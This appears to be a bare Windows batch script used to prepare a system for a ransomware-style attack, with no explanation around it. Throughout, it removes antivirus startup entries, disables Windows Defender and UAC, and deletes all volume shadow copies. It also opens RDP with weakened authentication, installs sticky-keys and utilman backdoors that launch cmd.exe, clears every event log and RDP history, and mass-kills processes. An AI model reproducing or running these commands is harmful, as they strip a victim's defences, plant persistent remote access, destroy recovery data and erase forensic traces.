Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{d08d9f98-1c78-4704-87e6-368b0023d831}\Config\OSSProxy" /v "" /t REG_SZ /d "" /f /reg:32
Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{d08d9f98-1c78-4704-87e6-368b0023d831}\Config\OSSProxy\Settings" /v "RunLine" /t REG_SZ /d "%ProgramFiles(x86)%\RelevantKnowledge\rlvknlg.exe -boot" /f /reg:32
Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{d08d9f98-1c78-4704-87e6-368b0023d831}\Config\OSSProxy\Settings" /v "ServiceName" /t REG_SZ /d "RelevantKnowledge" /f /reg:32
Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{d08d9f98-1c78-4704-87e6-368b0023d831}\Config\OSSProxy\Settings" /v "UninstURL" /t REG_SZ /d "http://www.relevantknowledge.com/confirmuninstall.aspx?siteid=2600&campaign_id=794" /f /reg:32
Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{d08d9f98-1c78-4704-87e6-368b0023d831}\Config\OSSProxy\Settings" /v "RevertPath" /t REG_SZ /d "%ProgramFiles(x86)%\RelevantKnowledge" /f /reg:32
Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "AvastUI.exe" /f /reg:32
Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "QHSafeTray" /f /reg:32
Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Zillya Antivirus" /f /reg:32
Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SBAMTray" /f /reg:32
Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SBRegRebootCleaner" /f /reg:32
Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "egui" /f /reg:32
Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "IseUI" /f /reg:32
Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "COMODO Internet Security" /f /reg:32
Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "ClamWin" /f /reg:32
Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Avira SystrayStartTrigger" /f /reg:32
Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "AVGUI.exe" /f /reg:32
Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SUPERAntiSpyware" /f /reg:32
Reg Delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SUPERAntiSpyware" /f /reg:32
Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "AvastUI.exe" /f /reg:64
Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "QHSafeTray" /f /reg:64
Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Zillya Antivirus" /f /reg:64
Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SBAMTray" /f /reg:64
Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SBRegRebootCleaner" /f /reg:64
Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "egui" /f /reg:64
Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "IseUI" /f /reg:64
Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "COMODO Internet Security" /f /reg:64
Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "ClamWin" /f /reg:64
Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Avira SystrayStartTrigger" /f /reg:64
Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "AVGUI.exe" /f /reg:64
Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SUPERAntiSpyware" /f /reg:64
Reg Delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SUPERAntiSpyware" /f /reg:64
)

vssadmin.exe Delete Shadows /All /Quiet


powershell Set-MpPreference -DisableRealtimeMonitoring $true
powershell Set-MpPreference -MAPSReporting 0
powershell Set-MpPreference -SubmitSamplesConsent 2
taskkill /F /IM MSASCuiL.exe
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "HideSCAHealth" /t REG_DWORD /d 0x1 /f
REG ADD "HKCU\Software\Policies\Microsoft\Windows\Explorer" /v "DisableNotificationCenter" /t REG_DWORD /d 0x1 /f
REG DELETE "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityHealth" /f
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 0x1 /f
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "AllowFastServiceStartup" /t REG_DWORD /d 0x0 /f
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "ServiceKeepAlive" /t REG_DWORD /d 0x0 /f
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableIOAVProtection" /t REG_DWORD /d 0x1 /f
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d 0x1 /f
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v "DisableBlockAtFirstSeen" /t REG_DWORD /d 0x1 /f
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v "LocalSettingOverrideSpynetReporting" /t REG_DWORD /d 0x0 /f
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v "SubmitSamplesConsent" /t REG_DWORD /d 0x2 /f
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\UX Configuration" /v "NotificationSuppress" /t REG_DWORD /d 0x1 /f


reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall add rule name="allow RemoteDesktop" dir=in protocol=TCP localport=3389 action=allow
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\HelpPane.exe" /f /v Debugger /t REG_SZ /d "%windir%\system32\cmd.exe"
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /f /v Debugger /t REG_SZ /d "%windir%\system32\cmd.exe"
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Magnify.exe" /f /v Debugger /t REG_SZ /d "%windir%\system32\cmd.exe"
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /f /v Debugger /t REG_SZ /d "%windir%\system32\cmd.exe"
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /f /v fDenyTSConnections /t REG_DWORD /d "00000000"
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /f /v fAllowUnsolicited /t REG_DWORD /d "00000001"
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /f /v UserAuthentication /t REG_DWORD /d "00000000"
REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /f /v SecurityLayer /t REG_DWORD /d "00000001"
REG add "HKLM\SYSTEM\CurrentControlSet\services\WinDefend" /v Start /t REG_DWORD /d 4 /f
REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t reg_dword /d 0 /f


@echo off
timeout /T 1
FOR /F "tokens=1,2*" %%V IN ('bcdedit') DO SET adminTest=%%V
IF (%adminTest%)==(Access) goto noAdmin
for /F "tokens=*" %%G in ('wevtutil.exe el') DO (call :do_clear "%%G")
echo.
echo Event Logs have been cleared!
goto theEnd
:do_clear
echo clearing %1
wevtutil.exe cl %1

goto :eof
:noAdmin
echo You must run this script as an Administrator!
echo.
:theEnd
rd /s /q %systemdrive%\$RECYCLE.BIN
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default" /va /f
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers" /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers"
cd %userprofile%\documents\
attrib Default.rdp -s -h
del Default.rdp

Echo TIME TO KILL ALL

vssadmin.exe Delete Shadows /All /Quiet

TASKKILL /F /FI "PID ge 1000" /FI "WINDOWTITLE ne untitle*"
taskkill -f -im IAStorIcon.exe
